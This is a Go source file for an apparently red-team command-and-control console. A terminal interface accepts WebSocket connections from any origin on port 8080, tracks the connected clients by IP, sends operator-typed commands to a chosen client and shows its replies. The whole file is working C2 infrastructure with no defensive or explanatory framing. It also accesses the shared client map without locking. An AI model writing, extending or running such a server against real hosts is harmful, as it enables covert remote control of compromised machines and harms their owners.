package main

import (
	"fmt"
	"log"
	"net"
	"net/http"
	"strings"

	"github.com/gdamore/tcell/v2"
	"github.com/gorilla/websocket"
	"github.com/rivo/tview"
)

var upgrader = websocket.Upgrader{
	CheckOrigin: func(r *http.Request) bool {
		return true
	},
}

// Map to store connections by IP address
var clients = make(map[string]*websocket.Conn)
var targetClient string
var app *tview.Application
var outputLog *tview.TextView

func writeMessage(baseString string, args ...any) {
	// Format the message string
	message := fmt.Sprintf(baseString, args...)

	// Queue the update to ensure thread safety and scroll to the end
	app.QueueUpdateDraw(func() {
		if _, err := fmt.Fprint(outputLog, message); err != nil {
			log.Printf("Error writing to outputLog: %v", err)
		}
		outputLog.ScrollToEnd()
	})
}

func handleWebSocket(w http.ResponseWriter, r *http.Request) {
	// Handle upgrading out client from an http request to a websocket request.
	connection, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Println("Upgrade error:", err)
		return
	}
	defer connection.Close()

	// Extract client IP address for storing them in a table
	clientIP, _, err := net.SplitHostPort(r.RemoteAddr)
	if err != nil {
		//log.Println("Error extracting IP:", err)
		writeMessage("Error extracting IP: %s", err)
		return
	}

	// Store the WebSocket connection by client IP
	clients[clientIP] = connection
	//log.Printf("Client connected: %s", clientIP)
	writeMessage("Client connected: %s\n", clientIP)

	// Keep the connection open for sending commands
	for {
		_, message, err := connection.ReadMessage()
		if err != nil {
			//log.Println("Read error:", err)
			writeMessage("Read error: %s\n", err)
			delete(clients, clientIP)
			break
		}

		//log.Printf("Received response from client [%s]: %s", clientIP, message)

		writeMessage("%s\n", message)
	}
}

// func sendCommandToClients(command string) {
// 	fullCommand := strings.TrimSpace(command)
// 	for clientIP, clientConn := range clients {
// 		if err := clientConn.WriteMessage(websocket.TextMessage, []byte(fullCommand)); err != nil {
// 			log.Printf("Write error for client [%s]: %s", clientIP, err)
// 			clientConn.Close()
// 			delete(clients, clientIP)
// 		} else {
// 			log.Printf("Command sent to client [%s]: %s", clientIP, fullCommand)
// 		}
// 	}
// }

func sendCommandToClient(ip_addr string, command string) {
	fullCommand := strings.TrimSpace(command)
	clientConn := clients[ip_addr]

	if err := clientConn.WriteMessage(websocket.TextMessage, []byte(fullCommand)); err != nil {
		writeMessage("Write error for client [%s]: %s\n", ip_addr, err)
		clientConn.Close()
		delete(clients, ip_addr)
		return
	}
	writeMessage("red@team: %s\n", command)
}

func main() {
	http.HandleFunc("/ws", handleWebSocket)
	app = tview.NewApplication()

	// Input field for client name
	var inputField *tview.InputField
	inputField = tview.NewInputField().
		SetLabel(" Client IP: ").
		SetLabelColor(tcell.ColorWhite).
		SetAcceptanceFunc(tview.InputFieldMaxLength(20)).
		SetDoneFunc(func(key tcell.Key) {
			if key == tcell.KeyEnter {
				ip_addr := inputField.GetText()
				_, ok := clients[ip_addr]
				if ok {
					targetClient = ip_addr
				} else {
					inputField.SetText("Invalid client IP address!")
				}
			}
		})

	inputField.SetTitle(" Select Client ").SetBorder(true).SetTitleAlign(tview.AlignLeft)

	// Input field for command name
	var commandField *tview.InputField
	commandField = tview.NewInputField().
		SetDoneFunc(func(key tcell.Key) {
			if key == tcell.KeyEnter {
				command := commandField.GetText()
				if targetClient != "" {
					if command == "clear" {
						outputLog.Clear()
					} else {
						sendCommandToClient(targetClient, command)
					}
				}
			}
		})

	commandField.SetTitle(" Send Command ").SetBorder(true).SetTitleAlign(tview.AlignLeft)

	// Text view to display the list of clients
	outputLog = tview.NewTextView()
	outputLog.SetTextAlign(tview.AlignLeft).
		SetDynamicColors(true).
		SetBorder(true).
		SetTitle(" Response ")

	// Assemble the layout
	flex := tview.NewFlex().
		AddItem(inputField, 0, 3, true).
		AddItem(tview.NewFlex().
			AddItem(outputLog, 0, 10, false).
			AddItem(commandField, 0, 1, false).SetDirection(tview.FlexRow), 0, 7, false)

	// Start the HTTP server in a goroutine
	go func() {
		if err := http.ListenAndServe(":8080", nil); err != nil {
			log.Fatal("ListenAndServe error:", err)
		}
	}()

	if err := app.SetRoot(flex, true).EnableMouse(true).Run(); err != nil {
		panic(err)
	}
	outputLog.SetText("Server started on http://localhost:8080\n")
}
